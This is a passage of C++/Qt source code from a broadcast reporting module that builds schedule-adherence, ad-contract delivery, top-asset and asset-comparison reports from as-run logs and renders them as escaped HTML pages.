            if (it.isHardStart()) startSec = it.fixedUtcMs > 0 ? (it.fixedUtcMs - hourStart) / 1000.0 : it.fixedOffsetSec;
            double dur = it.effectiveDurationSec(); if (dur <= 0) dur = it.durationSec;
            acc = startSec + dur;
            if (!it.isPlayable()) continue;
            const qint64 plannedMs = hourStart + qint64(startSec * 1000.0);
            const bool block = it.isQuery();
            // match: slot item id / runlist id first (a block takes every pick it aired), then mediaId within the hour (closest start)
            QList<int> hits; QString matchedBy;
            for (int i = 0; i < pool.size(); ++i) if (!used[i] && belongs(pool[i], it, block)) { hits << i; if (!block) break; }
            if (!hits.isEmpty()) matchedBy = block ? "block" : "item";
            else if (!block && !it.mediaId.isEmpty()) { int best = -1; qint64 bd = -1; for (int i = 0; i < pool.size(); ++i) if (!used[i] && pool[i].assetId == it.mediaId) { const qint64 d = qAbs(pool[i].actualStartMs - plannedMs); if (bd < 0 || d < bd) { bd = d; best = i; } } if (best >= 0) { hits << best; matchedBy = "media"; } }
            QJsonObject row; row["hour"] = hour; row["itemId"] = it.id; row["mediaId"] = it.mediaId; row["title"] = it.title; row["type"] = it.type; row["plannedMs"] = double(plannedMs); row["planned"] = fmtTs(plannedMs, tz, "HH:mm:ss");
            row["durationSec"] = dur; row["hardStart"] = it.isHardStart(); row["lateBound"] = block; row["slotId"] = slot.id;
            if (!hits.isEmpty()) {
                for (int i : hits) used[i] = true;
                const AsRunRow& r = pool[hits.first()];       // a block is one planned item: its status is its first pick's
                const qint64 ref = r.plannedStartMs > 0 ? r.plannedStartMs : plannedMs; const double delta = (r.actualStartMs - ref) / 1000.0;
                QString st = qAbs(delta) <= tol ? "on time" : (delta > 0 ? "late" : "early");
                if (st == "on time") { ++cOn; ++hOn; } else if (st == "late") { ++cLate; ++hLate; } else { ++cEarly; ++hEarly; }
                ++planned; ++hPlanned;
                row["status"] = st; row["actualMs"] = double(r.actualStartMs); row["actual"] = fmtTs(r.actualStartMs, tz, "HH:mm:ss"); row["deltaSec"] = delta; row["matchedBy"] = matchedBy; row["airedTitle"] = r.title;
                row["airedDurationSec"] = r.actualDurationMs / 1000.0; row["origin"] = r.origin; row["executorPlanned"] = r.plannedStartMs > 0 ? fmtTs(r.plannedStartMs, tz, "HH:mm:ss") : QString();
                if (block) {
                    QJsonArray picks; double airedSec = 0;
                    for (int i : hits) { const AsRunRow& p = pool[i]; QJsonObject pj; pj["itemId"] = p.itemId; pj["assetId"] = p.assetId; pj["title"] = p.title; pj["actualMs"] = double(p.actualStartMs); pj["actual"] = fmtTs(p.actualStartMs, tz, "HH:mm:ss"); pj["durationSec"] = p.actualDurationMs / 1000.0; airedSec += p.actualDurationMs / 1000.0; picks.append(pj); }
                    row["picks"] = picks; row["pickCount"] = picks.size(); row["airedDurationSec"] = airedSec;
                }
                matchedItems.append(row);
            } else if (plannedMs + tolMs > nowMs) {
                // not due yet (planned start + tolerance is still ahead): neither missed nor part of the score
                row["status"] = "pending"; row["actual"] = QString(); row["deltaSec"] = QJsonValue(); row["matchedBy"] = QString(); ++cPending; ++hPending;
            } else { row["status"] = "missed"; row["actual"] = QString(); row["deltaSec"] = QJsonValue(); row["matchedBy"] = QString(); ++cMissed; ++hMissed; ++planned; ++hPlanned; }
            items.append(row);
        }
        int hUns = 0;
        for (int i = 0; i < pool.size(); ++i) if (!used[i]) { const AsRunRow& r = pool[i]; QJsonObject u = rowJson(r, tz); u["actual"] = fmtTs(r.actualStartMs, tz, "HH:mm:ss"); unscheduled.append(u); ++cUns; ++hUns; }
        QJsonObject h; h["hour"] = hour; h["label"] = QString("%1:00").arg(hour, 2, 10, QChar('0')); h["planned"] = hPlanned; h["aired"] = pool.size(); h["onTime"] = hOn; h["late"] = hLate; h["early"] = hEarly; h["missed"] = hMissed; h["pending"] = hPending; h["unscheduled"] = hUns;
        h["scorePct"] = hPlanned > 0 ? 100.0 * hOn / hPlanned : QJsonValue(); h["slotId"] = slot.id; h["blockType"] = slot.blockType; hoursA.append(h);
    }
    std::sort(matchedItems.begin(), matchedItems.end(), [](const QJsonObject& a, const QJsonObject& b) { return qAbs(a.value("deltaSec").toDouble()) > qAbs(b.value("deltaSec").toDouble()); });
    QJsonArray worst; for (const QJsonObject& m : matchedItems) { if (worst.size() >= 10) break; if (m.value("status").toString() == "on time") break; worst.append(m); }

    // `planned` / the score count the items that are due (matched or missed); `pending` ones have not reached their start + tolerance yet
    QJsonObject counts; counts["onTime"] = cOn; counts["late"] = cLate; counts["early"] = cEarly; counts["missed"] = cMissed; counts["pending"] = cPending; counts["unscheduled"] = cUns;
    QJsonObject o; o["report"] = "adherence"; o["channel"] = channel; o["channelName"] = channelLabel(channel); o["date"] = isoDate(date); o["timezone"] = QString::fromUtf8(tz.id()); o["toleranceSec"] = tol;
    o["planned"] = planned; o["pending"] = cPending; o["aired"] = airedTotal; o["counts"] = counts; o["scorePct"] = planned > 0 ? 100.0 * cOn / planned : QJsonValue(); o["hours"] = hoursA; o["items"] = items; o["unscheduled"] = unscheduled; o["worst"] = worst;
    o["title"] = QString("Schedule Adherence — %1 · %2").arg(channelLabel(channel), longDate(date)); o["subtitle"] = QString("as-scheduled vs as-played · tolerance ±%1 s · %2").arg(num(tol, 0), QString::fromUtf8(tz.id()));
    return o;
}

// ---------------------------------------------------------------------------
// 6. Ad contracts (settings `traffic.contracts`)
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::contracts(const Q& q) const {
    const QTimeZone tz = tzFor(QString());
    const QDate today = todayIn(tz), asOf = parseDate(q.value("date"), today);
    const QDate pace = qMin(asOf, today);              // elapsed time never runs past the wall clock (a future as-of date has not happened yet)
    const qint64 nowMs = QDateTime::currentMSecsSinceEpoch();
    const QString only = q.value("id");
    const QJsonArray all = m_store->settingJson("traffic.contracts").value("contracts").toArray();

    // Contracts are parsed with the executor's own AdContract (aliases, `channels[]`, `title`, `status`), so the report follows the
    // shape the web / QML editors write (PUT /api/v1/traffic/contracts normalises through AdContract::fromJson / toJson).
    struct C { QJsonObject def; AdContract ac; QDate start, end; bool openStart = false, openEnd = false; QSet<QString> media; QStringList channels; QList<QPair<int, int>> dayparts;
               int aired = 0; QMap<QString, int> perDay; QHash<QString, int> perMedia; QHash<QString, QString> mediaTitle; };
    QList<C> cs;
    auto parseClock = [](const QJsonValue& v) -> int { if (v.isDouble()) return int(v.toDouble()) * 60; const QString s = v.toString(); const QStringList p = s.split(':'); if (p.isEmpty() || s.isEmpty()) return -1; return p[0].toInt() * 60 + (p.size() > 1 ? p[1].toInt() : 0); };
    for (const auto& v : all) {
        const QJsonObject d = v.toObject(); if (!only.isEmpty() && d.value("id").toString() != only) continue;
        C c; c.def = d; c.ac = AdContract::fromJson(d);
        // Window as FormatClock::contractReport sees it: an open end means "as of today" (the whole target is due now) and a missing start
        // has no total-spots pacing. The report still needs a window to count in, so a missing start looks back 30 days (and then only
        // a per-day rate can be paced).
        c.openStart = !c.ac.startDate.isValid(); c.start = c.openStart ? asOf.addDays(-29) : c.ac.startDate;
        c.openEnd = !c.ac.endDate.isValid(); c.end = c.openEnd ? qMax(asOf, c.start) : c.ac.endDate;
        if (c.end < c.start) std::swap(c.start, c.end); if (c.start.daysTo(c.end) > kMaxDays) c.end = c.start.addDays(kMaxDays);
        for (const QString& m : c.ac.mediaIds) if (!m.isEmpty()) c.media.insert(m);
        if (!d.value("mediaId").toString().isEmpty()) c.media.insert(d.value("mediaId").toString());
        c.channels = c.ac.channels;                                   // empty = every channel
        if (c.channels.isEmpty()) { const QString legacy = d.value("channel").toString(); if (!legacy.isEmpty() && legacy != "all") c.channels << legacy; }
        for (const auto& dp : c.ac.dayparts) { const QJsonObject o = dp.toObject(); const int a = parseClock(o.value("from")), b = parseClock(o.value("to")); if (a >= 0 && b >= 0) c.dayparts.append(qMakePair(a, b)); }
        cs.append(c);
    }
    QHash<QString, QList<int>> byMedia; for (int i = 0; i < cs.size(); ++i) for (const QString& m : cs[i].media) byMedia[m].append(i);
    const ChanInfo chans(m_store, tz);
    auto tally = [&](const AsRunRow& r) {
        if (r.eventType != "START") return; auto it = byMedia.constFind(r.assetId); if (it == byMedia.constEnd()) return;
        for (int ci : it.value()) {
            C& c = cs[ci]; if (!c.channels.isEmpty() && !c.channels.contains(r.channelId)) continue;
            const QTimeZone rtz = chans.tzOf(r.channelId); const QDate d = localDate(r.actualStartMs, rtz); if (d < c.start || d > c.end) continue;
            if (!c.dayparts.isEmpty()) { const int mod = localMinuteOfDay(r.actualStartMs, rtz); bool ok = false; for (const auto& dp : c.dayparts) { if (dp.first <= dp.second ? (mod >= dp.first && mod < dp.second) : (mod >= dp.first || mod < dp.second)) { ok = true; break; } } if (!ok) continue; }
            ++c.aired; c.perDay[isoDate(d)]++; c.perMedia[r.assetId]++; if (!c.mediaTitle.contains(r.assetId)) c.mediaTitle[r.assetId] = r.title;
        }
    };

    // --- scan: the contract windows merged into disjoint spans (one pass per span, only the channels the span's contracts run on) -----
    // A single scanFrom..scanTo range over all contracts would walk years of as-run between two distant campaigns; the spans, the
    // total days scanned (kMaxDays, newest first) and the shared time budget keep the work on the event-loop thread bounded.
    struct Span { QDate from, to; bool all = false; QSet<QString> chans; };
    QList<Span> spans;
    for (const C& c : cs) { if (c.media.isEmpty() || c.start > asOf) continue; Span s; s.from = c.start; s.to = qMin(c.end, asOf); s.all = c.channels.isEmpty(); for (const QString& ch : c.channels) s.chans.insert(ch); spans.append(s); }
    std::sort(spans.begin(), spans.end(), [](const Span& a, const Span& b) { return a.from < b.from; });
    QList<Span> merged;
    for (const Span& s : spans) {
        if (!merged.isEmpty() && s.from <= merged.last().to.addDays(1)) { Span& m = merged.last(); m.to = qMax(m.to, s.to); m.all = m.all || s.all; m.chans.unite(s.chans); }
        else merged.append(s);
    }
    bool truncated = false; ScanBudget budget; int spanDays = 0; const QStringList everyChannel = allChannelIds(m_store);
    for (int i = merged.size() - 1; i >= 0; --i) {
        Span s = merged[i]; int days = int(s.from.daysTo(s.to)) + 1;
        if (spanDays + days > kMaxDays) { const int room = kMaxDays - spanDays; truncated = true; if (room <= 0) break; s.from = s.to.addDays(-(room - 1)); days = room; }
        spanDays += days;
        const QStringList chList = s.all ? everyChannel : QStringList(s.chans.begin(), s.chans.end());
        if (scanRows(m_store, chList, dayStart(s.from, tz), dayStart(s.to.addDays(1), tz) - 1, tally, &budget)) truncated = true;
    }

    MediaIndex idx(m_store);
    QJsonArray out; int onPace = 0, behind = 0, complete = 0, inactive = 0, noTarget = 0, totalAired = 0, totalTarget = 0;
    for (const C& c : cs) {
        const AdContract& ac = c.ac; const bool active = ac.status == "active";
        const int totalDays = int(c.start.daysTo(c.end)) + 1;
        const int elapsed = pace < c.start ? 0 : qMin(totalDays, int(c.start.daysTo(qMin(pace, c.end))) + 1);     // whole days, inclusive
        // Expected-to-date and the projection run on fractional days: the day in progress counts only as far as the wall clock has got into
        // it (a contract delivering perfectly read "behind" for most of every day when the whole partial day was treated as elapsed).
        double elapsedExact = 0.0;
        if (pace >= c.start) {
            double frac = 1.0;
            if (pace <= c.end) { const qint64 ds = dayStart(pace, tz), de = dayStart(pace.addDays(1), tz); frac = qBound(0.0, double(nowMs - ds) / double(de - ds), 1.0); }
            elapsedExact = qMin(double(totalDays), double(c.start.daysTo(qMin(pace, c.end))) + frac);
        }
        const int spotsPerDay = ac.spotsPerDay, spotsTotal = ac.spotsTotal;
        // FormatClock paces a spotsTotal contract that has a start date; spotsPerDay x days is the report's own per-day target; neither = no target
        const int target = (spotsTotal > 0 && !c.openStart) ? spotsTotal : spotsPerDay * totalDays;
        const double expected = target > 0 ? double(target) * elapsedExact / totalDays : 0.0;
        const double pacing = expected > 0 ? 100.0 * c.aired / expected : (c.aired > 0 ? 100.0 : 0.0);
        const double projected = elapsedExact > 0 ? double(c.aired) / elapsedExact * totalDays : 0.0;
        const int shortfall = target > 0 ? qMax(0, target - qRound(projected)) : 0;
        QString status;
        if (!active) status = ac.status.isEmpty() ? QStringLiteral("inactive") : ac.status;   // paused | done: shown as such, never counted as behind (AdContract::activeOn: only "active" paces)
        else if (target <= 0) status = "no target";
        else if (c.aired >= target) status = "complete";
        else if (pace < c.start) status = "not started";
        else if (pace > c.end) status = "under-delivered";
        else status = (pacing >= 95.0 || expected < 1.0) ? "on pace" : "behind";      // less than one spot due so far is nothing to be behind on
        if (!active) ++inactive; else if (status == "no target") ++noTarget; else if (status == "complete") ++complete; else if (status == "on pace") ++onPace; else if (status == "behind" || status == "under-delivered") ++behind;
        if (active) { totalAired += c.aired; totalTarget += target; }
        QJsonArray days; for (QDate d = c.start; d <= c.end && days.size() <= kMaxDays; d = d.addDays(1)) { QJsonObject o; o["date"] = isoDate(d); o["label"] = d.toString("dd"); o["spots"] = c.perDay.value(isoDate(d), 0); o["future"] = d > asOf; days.append(o); }
        QJsonArray media; { QStringList ids(c.media.begin(), c.media.end()); ids.sort(); for (const QString& id : ids) { QJsonObject o; const MediaRecord* m = idx.find(id); o["id"] = id; o["title"] = m ? (m->title.isEmpty() ? id : m->title) : c.mediaTitle.value(id, id); o["inLibrary"] = m != nullptr; o["durationSec"] = m ? m->durationSec : 0.0; o["aired"] = c.perMedia.value(id, 0); media.append(o); } }
        QJsonObject o = c.def;                                        // stored keys first (unknown extras survive), then the normalised AdContract shape on top
        const QJsonObject norm = ac.toJson(); for (auto it = norm.constBegin(); it != norm.constEnd(); ++it) o[it.key()] = it.value();
        o["id"] = c.def.value("id").toString();                       // fromJson invents an id for an id-less contract; keep what is stored
        o["startDate"] = isoDate(c.start); o["endDate"] = isoDate(c.end); o["openStart"] = c.openStart; o["openEnd"] = c.openEnd; o["totalDays"] = totalDays; o["elapsedDays"] = elapsed; o["elapsedExact"] = elapsedExact;
        o["target"] = target; o["aired"] = c.aired; o["expectedToDate"] = expected;
        o["pacingPct"] = pacing; o["deliveryPct"] = target > 0 ? 100.0 * c.aired / target : QJsonValue(); o["projected"] = qRound(projected); o["shortfall"] = shortfall; o["remaining"] = qMax(0, target - c.aired);
        o["contractStatus"] = ac.status; o["status"] = status; o["perDay"] = days; o["media"] = media;     // `status` = delivery status (or the paused/done contract status)
        out.append(o);
    }
    QJsonObject s; s["contracts"] = out.size(); s["onPace"] = onPace; s["behind"] = behind; s["complete"] = complete; s["inactive"] = inactive; s["noTarget"] = noTarget; s["aired"] = totalAired; s["target"] = totalTarget;
    QJsonObject o; o["report"] = "contracts"; o["asOf"] = isoDate(asOf); o["contracts"] = out; o["summary"] = s; o["truncated"] = truncated; o["configured"] = all.size();
    o["title"] = only.isEmpty() ? "Ad Contract Delivery" : "Ad Contract Delivery — " + only; o["subtitle"] = QString("spot delivery vs contract · as of %1 · %2 contract(s)").arg(isoDate(asOf)).arg(out.size());
    return o;
}

// ---------------------------------------------------------------------------
// 7. Top assets / compare
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::top(const Q& q) const {
    QString channel = q.value("channel"); if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    const int days = clampInt(q.value("days"), 30, 1, kMaxDays), n = clampInt(q.value("n"), 25, 1, 200);
    const QString type = q.value("type");
    const QDate today = todayIn(tz), from = today.addDays(-(days - 1));
    MediaIndex idx(m_store);
    QHash<QString, Agg> byAsset; int airings = 0; double airtime = 0;
    const bool truncated = scanRows(m_store, channel, dayStart(from, tz), dayStart(today.addDays(1), tz) - 1, [&](const AsRunRow& r) {
        if (r.eventType != "START") return; if (!type.isEmpty() && r.type != type) return;
        ++airings; airtime += r.actualDurationMs / 1000.0;
        const QString key = r.assetId.isEmpty() ? "title:" + r.title : r.assetId; Agg& a = byAsset[key]; a.key = key; a.name = r.title.isEmpty() ? r.assetId : r.title; a.add(r);
    });
    QJsonArray rows; int rank = 0;
    for (const auto& v : aggTable(byAsset, airtime, tz, n, true)) {
        QJsonObject o = v.toObject(); const QString key = o.value("key").toString(); const MediaRecord* m = key.startsWith("title:") ? nullptr : idx.find(key);
        o["rank"] = ++rank; o["assetId"] = key.startsWith("title:") ? QString() : key; o["inLibrary"] = m != nullptr; o["type"] = m ? m->type : QString(); o["client"] = m ? m->client : QString(); o["category"] = m ? m->extra.value("category").toString() : QString(); o["series"] = m ? m->series : QString();
        o["durationSec"] = m ? m->durationSec : 0.0; rows.append(o);
    }
    QJsonObject o; o["report"] = "top"; o["days"] = days; o["n"] = n; o["type"] = type; o["channel"] = channel; o["from"] = isoDate(from); o["to"] = isoDate(today); o["timezone"] = QString::fromUtf8(tz.id());
    o["rows"] = rows; o["airings"] = airings; o["airtimeSec"] = airtime; o["uniqueAssets"] = byAsset.size(); o["truncated"] = truncated;
    o["title"] = QString("Top %1 Assets — last %2 days").arg(n).arg(days); o["subtitle"] = QString("%1 → %2 · %3%4").arg(isoDate(from), isoDate(today), channelLabel(channel), type.isEmpty() ? QString() : " · type " + type);
    return o;
}

QJsonObject ReportBuilder::compare(const Q& q) const {
    QString channel = q.value("channel"); if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    const int days = clampInt(q.value("days"), 30, 1, kMaxDays);
    QStringList ids = splitList(q.value("ids")); if (ids.size() > 8) ids = ids.mid(0, 8);
    if (ids.isEmpty()) { QJsonObject o; o["error"] = "ids required (comma-separated, up to 8)"; o["status"] = 400; return o; }
    const QDate today = todayIn(tz), from = today.addDays(-(days - 1));
    QHash<QString, int> pos; for (int i = 0; i < ids.size(); ++i) pos.insert(ids[i], i);
    QMap<QString, QList<int>> matrix; for (QDate d = from; d <= today; d = d.addDays(1)) { QList<int> z; for (int i = 0; i < ids.size(); ++i) z.append(0); matrix.insert(isoDate(d), z); }
    QList<int> totals; QList<double> airtime; for (int i = 0; i < ids.size(); ++i) { totals.append(0); airtime.append(0.0); }
    const bool truncated = scanRows(m_store, channel, dayStart(from, tz), dayStart(today.addDays(1), tz) - 1, [&](const AsRunRow& r) {
        if (r.eventType != "START") return; auto it = pos.constFind(r.assetId); if (it == pos.constEnd()) return;
        const QString d = isoDate(localDate(r.actualStartMs, tz)); if (matrix.contains(d)) matrix[d][it.value()]++; totals[it.value()]++; airtime[it.value()] += r.actualDurationMs / 1000.0;
    });
    QJsonArray assetsA; for (int i = 0; i < ids.size(); ++i) { bool f = false; const MediaRecord m = m_store->media(ids[i], &f); QJsonObject o; o["id"] = ids[i]; o["title"] = f ? (m.title.isEmpty() ? m.id : m.title) : ids[i]; o["type"] = f ? m.type : QString(); o["client"] = f ? m.client : QString(); o["inLibrary"] = f; o["airings"] = totals[i]; o["airtimeSec"] = airtime[i]; o["perDay"] = days > 0 ? double(totals[i]) / days : 0.0; assetsA.append(o); }
    QJsonArray daysA; for (auto it = matrix.constBegin(); it != matrix.constEnd(); ++it) { QJsonObject o; o["date"] = it.key(); QJsonArray c; int t = 0; for (int v : it.value()) { c.append(v); t += v; } o["counts"] = c; o["total"] = t; daysA.append(o); }
    QJsonObject o; o["report"] = "compare"; o["days"] = days; o["channel"] = channel; o["from"] = isoDate(from); o["to"] = isoDate(today); o["timezone"] = QString::fromUtf8(tz.id()); o["assets"] = assetsA; o["daysTable"] = daysA; o["truncated"] = truncated;
    o["title"] = QString("Asset Comparison — %1 assets, last %2 days").arg(ids.size()).arg(days); o["subtitle"] = QString("airings per day · %1 → %2 · %3").arg(isoDate(from), isoDate(today), channelLabel(channel));
    return o;
}

// ---------------------------------------------------------------------------
// HTML shell
// ---------------------------------------------------------------------------
QByteArray ReportBuilder::shell(const QString& title, const QString& subtitle, const QString& body, const QString& kicker) const {
    const QJsonObject b = brand();
    const QString name = b.value("name").toString(), accent = b.value("accent").toString(), logo = b.value("logoUrl").toString();
    QString css = QString::fromLatin1(kCss); css.replace("%ACCENT%", accent.contains(QRegularExpression("^#[0-9a-fA-F]{3,8}$")) ? accent : QStringLiteral("#d80018"));
    QString wm; { const int sp = name.lastIndexOf(' '); wm = sp > 0 ? esc(name.left(sp + 1)) + "<b>" + esc(name.mid(sp + 1)) + "</b>" : "<b>" + esc(name) + "</b>"; }
    const QString gen = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm");
    QString out;
    out += "<!DOCTYPE html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
    out += "<title>" + esc(title) + " — " + esc(name) + "</title>\n<style>" + css + "</style></head><body><div class=\"wrap\">\n<div class=\"mast\">\n  <div class=\"top\">\n";
    if (!logo.isEmpty()) out += "    <img src=\"" + esc(logo) + "\" alt=\"\" onerror=\"this.style.display='none'\">\n";
    out += "    <span class=\"wm\">" + wm + "</span>\n    <span class=\"kicker\">" + esc(b.value("tagline").toString()) + "<br>" + esc(kicker.isEmpty() ? QStringLiteral("Broadcast As-Played Report") : kicker) + "</span>\n  </div>\n";
    out += "  <h1>" + esc(title) + "</h1>\n  <div class=\"sub\">" + esc(subtitle) + " · generated " + gen + "</div>\n";
    out += "  <div class=\"nav\"><a href=\"/reports/index.html\">Reports</a><a href=\"/reports/asplayed.html\">As-played</a><a href=\"/reports/full.html?period=weekly\">Weekly</a><a href=\"/reports/full.html?period=monthly\">Monthly</a><a href=\"/reports/adherence.html\">Adherence</a><a href=\"/reports/contracts.html\">Contracts</a><a href=\"/reports/top.html\">Top assets</a><a href=\"/reports/assets.html\">Assets</a></div>\n</div>\n";
    out += body;
    out += "\n<footer>" + esc(b.value("footer").toString()) + " · figures reflect actual airings from the as-run log; planned times come from the ScheduleExecutor at air time</footer>\n</div><script>" + QString::fromLatin1(kJs) + "</script></body></html>\n";
    return out.toUtf8();
}

// ---------------------------------------------------------------------------
// Renderers
// ---------------------------------------------------------------------------
namespace {
QString truncNote(const QJsonObject& d) { return d.value("truncated").toBool() ? "<div class='trunc'>This report hit its row or time limit; narrow the date range, pick one channel or add filters for a complete picture.</div>" : QString(); }
/// One as-run row. Columns: [Channel] Planned Actual Δ Event Status [Title] Type Origin Duration [link].
QString airingRow(const QJsonObject& r, bool withChannel, bool withTitle, bool withLink = false) {
    QString s = "<tr>";
    if (withChannel) s += "<td>" + esc(r.value("channel").toString()) + "</td>";
    s += "<td class='t'>" + esc(r.value("planned").toString()) + "</td><td class='t'>" + esc(r.value("actual").toString()) + "</td>" + deltaCell(r.value("varianceSec"));
    s += "<td><b>" + esc(r.value("event").toString()) + "</b></td><td>" + pill(r.value("disp").toString()) + "</td>";
    if (withTitle) s += "<td>" + esc(r.value("title").toString()) + "</td>";
    s += "<td>" + esc(r.value("type").toString()) + "</td><td>" + esc(r.value("origin").toString()) + "</td><td class='t n'>" + hms(r.value("durationSec").toDouble()) + "</td>";
    if (withLink) s += "<td><a href='" + esc(r.value("asplayedUrl").toString()) + "'>hour ↗</a></td>";
    return s + "</tr>";
}
QStringList airingCols(bool withChannel, bool withTitle, bool withLink = false) {
    QStringList c; if (withChannel) c << "Channel"; c << "Planned" << "Actual" << "#Δ" << "Event" << "Status"; if (withTitle) c << "Title"; c << "Type" << "Origin" << "#Duration"; if (withLink) c << ""; return c;
}
QString aggRows(const QJsonArray& rows, bool assetLinks) {
    QString s; int i = 0;
    for (const auto& v : rows) {
        const QJsonObject r = v.toObject(); const QString key = r.value("key").toString(); const bool linkable = assetLinks && !key.isEmpty() && !key.startsWith("title:");
        s += QString("<tr><td class='rk'>%1</td><td>%2</td><td class='n'>%3</td><td class='n t'>%4</td><td class='n'>%5</td><td class='n'>%6</td><td class='n'>%7</td><td>%8</td></tr>")
            .arg(++i).arg(linkable ? "<a class='q' href='/reports/asset/" + esc(QString::fromUtf8(QUrl::toPercentEncoding(key))) + ".html'>" + esc(r.value("name").toString()) + "</a>" : esc(r.value("name").toString()))
            .arg(r.value("airings").toInt()).arg(hms(r.value("airtimeSec").toDouble())).arg(r.value("uniqueAssets").toInt()).arg(num(r.value("sharePct").toDouble()) + "%")
            .arg(r.value("onTimePct").isNull() ? QStringLiteral("—") : num(r.value("onTimePct").toDouble(), 0) + "%").arg(esc(jsStr(r.value("channels"))));
    }
    return s;
}
QString aggTableHtml(const QJsonArray& rows, bool assetLinks = true) {
    if (rows.isEmpty()) return none("no data in this period");
    return "<table class='plain'>" + thead({ "", "Name", "#Airings", "#Airtime", "#Assets", "#Share", "#On-time", "Channels" }) + "<tbody>" + aggRows(rows, assetLinks) + "</tbody></table>";
}
QString mediaKv(const QJsonObject& m) {
    auto kv = [](const QString& k, const QString& v) { return v.isEmpty() ? QString() : "<tr><td>" + esc(k) + "</td><td>" + esc(v) + "</td></tr>"; };
    QString s = "<table class='kv'>";
    s += kv("Type", m.value("type").toString()) + kv("Duration", hms(m.value("durationSec").toDouble())) + kv("Series", m.value("series").toString()) + kv("Client", m.value("client").toString());
    const QString cat = m.value("category").toString(), sub = m.value("subcategory").toString(); s += kv("Category", sub.isEmpty() ? cat : cat + " / " + sub);
    s += kv("Tags", jsStr(m.value("tags"))) + kv("Added", m.value("added").toString()) + kv("Play count", QString::number(m.value("playCount").toInt())) + kv("Last played", m.value("lastPlayedMs").toDouble() > 0 ? m.value("lastPlayed").toString() : QString());
    s += kv("Origin", m.value("origin").toString()) + kv("Status", m.value("status").toString()) + kv("Available", (m.value("availableStart").toString().isEmpty() && m.value("availableEnd").toString().isEmpty()) ? QString() : m.value("availableStart").toString() + " → " + m.value("availableEnd").toString());
    s += kv("Channels", jsStr(m.value("allowedChannels"))) + kv("File", m.value("path").toString()) + kv("Asset id", m.value("id").toString()) + kv("Notes", m.value("notes").toString());
    return s + "</table>";
}
}

QString ReportBuilder::htmlAsPlayed(const QJsonObject& d) const {
    const QJsonObject s = d.value("summary").toObject();
    QString b = "<div class='cards'>" + card("Airings", QString::number(s.value("airings").toInt())) + card("On-time", s.value("onTimePct").isNull() ? "—" : num(s.value("onTimePct").toDouble(), 0) + "%", QString("%1 scheduled").arg(s.value("scheduled").toInt()))
        + card("Late > 5 s", QString::number(s.value("late5s").toInt())) + card("Skipped / failed", QString("%1 / %2").arg(s.value("skipped").toInt()).arg(s.value("failed").toInt())) + card("Fill", hms(s.value("fillSec").toDouble()), QString("%1 items").arg(s.value("fill").toInt()))
        + card("Total aired", hms(s.value("airedSec").toDouble())) + card("Unique assets", QString::number(s.value("uniqueAssets").toInt())) + card("Avg |variance|", num(s.value("avgAbsVarianceSec").toDouble(), 2) + " s") + "</div>";
    b += truncNote(d);
    b += h2("Airtime by hour") + barChart(d.value("hours").toArray(), "label", "airedSec", "{label}:00 — {value} s aired");
    const QJsonArray rows = d.value("rows").toArray();
    const bool allCh = d.value("channel").toString().isEmpty();
    b += h2("Events", QString("%1 rows").arg(rows.size()));
    if (rows.isEmpty()) return b + none("no as-run events in this window");
    const QStringList cols = airingCols(allCh, true);
    QString tb, curKey;
    for (const auto& v : rows) {
        const QJsonObject r = v.toObject(); const QString key = r.value("date").toString() + "-" + QString::number(r.value("hour").toInt());
        if (key != curKey) { curKey = key; tb += QString("<tr class='hr' id='h-%1'><td colspan='%2'>%3 · %4:00</td></tr>").arg(esc(key)).arg(cols.size()).arg(esc(r.value("date").toString())).arg(r.value("hour").toInt(), 2, 10, QChar('0')); }
        tb += airingRow(r, allCh, true);
    }
    return b + "<table class='plain'>" + thead(cols) + "<tbody>" + tb + "</tbody></table>";
}

QString ReportBuilder::htmlAsset(const QJsonObject& d) const {
    const QJsonObject m = d.value("media").toObject(), t = d.value("totals").toObject();
    QString b = "<div class='mcard'>" + thumbImg(m.value("thumbnail").toString().isEmpty() ? QString() : m.value("id").toString(), 124) + "<div><h3>" + esc(m.value("title").toString()) + (d.value("neverAired").toBool() ? " " + pill("never aired") : QString()) + "</h3>" + mediaKv(m) + "</div></div>";
    b += "<div class='cards' style='margin-top:14px'>" + card("Airings", QString::number(t.value("airings").toInt()), QString("%1 / day").arg(num(t.value("perDay").toDouble(), 2))) + card("Airtime", hms(t.value("airtimeSec").toDouble()))
        + card("On-time", t.value("onTimePct").isNull() ? "—" : num(t.value("onTimePct").toDouble(), 0) + "%", QString("%1 late · %2 early").arg(t.value("late").toInt()).arg(t.value("early").toInt())) + card("Skipped / failed", QString("%1 / %2").arg(t.value("skipped").toInt()).arg(t.value("failed").toInt()))
        + card("Upcoming", QString::number(t.value("upcomingDirect").toInt() + t.value("upcomingViaBlock").toInt()), QString("%1 direct · %2 via block").arg(t.value("upcomingDirect").toInt()).arg(t.value("upcomingViaBlock").toInt())) + card("Lifetime plays", QString::number(m.value("playCount").toInt())) + "</div>";
    b += truncNote(d);
    b += "<div class='two'><div>" + h2("By channel") + aggTableHtml(t.value("byChannel").toArray(), false) + "</div><div>" + h2("By daypart");
    const QJsonArray dps = t.value("byDaypart").toArray(); int mx = 0; for (const auto& v : dps) mx = qMax(mx, v.toObject().value("airings").toInt());
    b += "<div class='asset' style='padding:10px 14px'>";
    for (const auto& v : dps) { const QJsonObject o = v.toObject(); const int n = o.value("airings").toInt(); b += QString("<div class='hbar'><span class='nm'>%1</span><span class='bar'><span style='width:%2%'></span></span><span class='v'>%3 · %4</span></div>").arg(esc(o.value("name").toString())).arg(mx > 0 ? 100 * n / mx : 0).arg(n).arg(hms(o.value("airtimeSec").toDouble())); }
    b += "</div></div></div>";
    b += h2("Airings", d.value("from").toString() + " → " + d.value("to").toString());
    const QJsonArray days = d.value("airingsByDay").toArray();
    if (days.isEmpty()) b += none("no airings in this window");
    else {
        QString tb;
        for (int i = days.size() - 1; i >= 0; --i) {   // newest day first
            const QJsonObject day = days[i].toObject(); tb += QString("<tr class='hr'><td colspan='10'>%1 · %2 event(s)</td></tr>").arg(esc(longDate(QDate::fromString(day.value("date").toString(), Qt::ISODate)))).arg(day.value("count").toInt());
            for (const auto& v : day.value("rows").toArray()) tb += airingRow(v.toObject(), true, false, true); }
        b += "<table class='plain'>" + thead(airingCols(true, false, true)) + "<tbody>" + tb + "</tbody></table>";
    }
